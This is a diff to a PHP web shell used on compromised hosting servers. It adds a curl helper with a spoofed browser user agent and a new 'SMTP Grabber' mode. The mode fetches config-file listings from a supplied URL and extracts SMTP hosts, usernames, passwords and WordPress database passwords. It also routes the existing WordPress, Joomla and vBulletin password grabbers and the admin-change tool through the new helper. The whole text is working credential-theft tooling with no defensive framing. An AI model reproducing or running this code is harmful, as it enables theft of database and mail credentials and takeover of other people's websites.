@@ -16,6 +16,22 @@
 
 error_reporting(0);
 
+function httpGet($url)
+{
+    $ch = curl_init();  
+ 
+    curl_setopt($ch,CURLOPT_URL,$url);
+    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
+		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0");
+		curl_setopt ($ch, CURLOPT_HEADER, 1);
+ curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
+    $output=curl_exec($ch);
+ 
+    curl_close($ch);
+    return $output;
+}
+
+
 	echo '<head>
 
 <style type="text/css">
@@ -940,9 +956,22 @@ SecFilterScanPOST Off
     <tr>
    <td valign="top" bgcolor="#000" style="width: 139px"><strong>Get Fucker!!!</strong></td>
    <td valign="top" bgcolor="#000" colspan="5">
-	          <a href="?0=cpgrab">cPanel Grabber</a>|||||||||| <a href="?0=jumping">Jumping</a>|||||||||| <a href="?0=goblok">cPanel SMTP</a>|||||||||| <a href="?0=wp">Wordpress Setup</a><br>
+	          <a href="?0=cpgrab">cPanel Grabber</a>|||||||||| <a href="?0=jumping">Jumping</a>|||||||||| <a href="?0=goblok">cPanel SMTP</a>|||||||||| <a href="?0=wp">Wordpress Setup</a>|||||||||| <a href="?0=smtpxd">SMTP Grabber</a><br>
 	          
+<?php
+set_time_limit(0);
 
+if($_GET['0'] == 'smtpxd'){
+
+
+	echo '<form method="post">
+<input type="text" name="chsmtpconfig" placeholder="Config URL Here">
+<br><br>
+<input type="submit" name="chsmtp" value="Submit">
+</form>';
+
+}
+?>
  <?php
  set_time_limit(0);
 if($_GET['0'] == 'wp'){
@@ -953,10 +982,10 @@ if($_GET['0'] == 'wp'){
 <input type="submit" name="chxe" value="Change Admin">
 </form><br><br>
 <?php
- if($_POST['chxe']){ $get2 = file_get_contents($_POST['confleg']);
+ if($_POST['chxe']){ $get2 = httpGet($_POST['confleg']);
  preg_match_all('#<a href="(.*?)"#', $get2, $config);
   $count = 1;
- foreach($config[1] as $don){ $get = file_get_contents($_POST['confleg']."/".$don);
+ foreach($config[1] as $don){ $get = httpGet($_POST['confleg']."/".$don);
  preg_match_all("/DB_HOST', '(.*?)'/", $get, $host);
  foreach($host[1] as $don){ $host = $don;
  } preg_match_all("/DB_PASSWORD', '(.*?)'/", $get, $pass);
@@ -1238,18 +1267,52 @@ elseif($_GET['0'] == 'jumping') {
 <input type="submit" name="ch" value="Submit">
 </form>
 </center>
+<?php set_time_limit(0);
+ error_reporting(0);
+ $g = $_POST['chsmtp'];
+                                        $dir = $_POST['chsmtpconfig'];
+                                        if (isset($g) && $dir != "") {
 
+
+
+                                        	$cn = httpGet($dir);
+                                            //preg_match_all('#href="(.*?)">(.*?)<#',$cn,$m);    // $m[2]
+
+
+                                            preg_match_all('#href="(.*?)"#', $cn, $m);
+                                            foreach ($m[1] as $txt) {
+                                                $url = $dir . $txt;
+                                                $cnurl = httpGet($url);
+preg_match('#\'DB_PASSWORD\', \'(.*)\'#', $cnurl, $m1); // wordpress
+                                                preg_match('#smtphost = \'(.*)\'#', $cnurl, $smtphost); // smtphost
+                                                preg_match('#smtpuser = \'(.*)\'#', $cnurl, $smtpuser); // smtpuser
+                                                preg_match('#smtppass = \'(.*)\'#', $cnurl, $smtppass); // smtppass
+                                                preg_match('#smtpport = \'(.*)\'#', $cnurl, $smtpport); // smtpport
+                                                if (!empty($smtppass[1])) {
+                                                	echo $smtphost[1]."|".$smtpport[1]."|".$smtpuser[1]."|".$smtppass[1] . "<br>";
+                                                }
+                                            }
+                                        }
+
+
+
+?>
 <?php set_time_limit(0);
  error_reporting(0);
  $g = $_POST['ch'];
                                         $dir = $_POST['config'];
                                         if (isset($g) && $dir != "") {
-                                            $cn = @file_get_contents($dir);
+
+
+
+                                        	$cn = httpGet($dir);
                                             //preg_match_all('#href="(.*?)">(.*?)<#',$cn,$m);    // $m[2]
+
+
                                             preg_match_all('#href="(.*?)"#', $cn, $m);
                                             foreach ($m[1] as $txt) {
                                                 $url = $dir . $txt;
-                                                $cnurl = @file_get_contents($url);
+                                                $cnurl = httpGet($url);
                                                 preg_match('#\'DB_PASSWORD\', \'(.*)\'#', $cnurl, $m1); // wordpress
                                                 preg_match('#password = \'(.*)\'#', $cnurl, $m2); // joomla
                                                 preg_match('#password\'] = \'(.*)\'#', $cnurl, $m3); // vb
@@ -1261,6 +1324,7 @@ elseif($_GET['0'] == 'jumping') {
                                                 preg_match('#password_localhost = "(.*)"#', $cnurl, $m9); // conexao.php
                                                 preg_match('#senha = "(.*)"#', $cnurl, $m10); // /_inc/config.inc.php
                                                 if (!empty($m1[1])) {
+
                                                     echo $m1[1] . "<br>";
                                                 } elseif (!empty($m2[1])) {
                                                     echo $m2[1] . "<br>";
